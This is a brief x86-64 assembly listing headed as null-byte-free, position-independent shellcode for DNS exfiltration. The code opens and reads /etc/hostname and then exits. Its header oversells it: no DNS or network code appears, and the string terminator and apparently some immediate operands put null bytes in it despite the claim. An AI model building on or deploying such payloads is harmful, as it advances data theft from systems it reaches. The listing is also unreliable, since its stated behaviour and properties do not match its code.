
; DNS Exfiltration - Shellcode PIC (null-byte-free)
push rbp
mov rbp, rsp
sub rsp, 512

xor r10, r10
xor r11, r11

lea rdi, [rel filename]
xor rax, rax
mov al, 2
xor rsi, rsi
xor rdx, rdx
syscall

cmp rax, 0
jl exit_fail

mov r8, rax

mov rdi, r8
mov rsi, rbp
sub rsi, 256
mov rdx, 255
xor rax, rax
syscall
mov r9, rax

xor rdi, rdi
xor rax, rax
mov al, 60
syscall

exit_fail:
mov rdi, 1
xor rax, rax
mov al, 60
syscall

filename:
db "/etc/hostname", 0
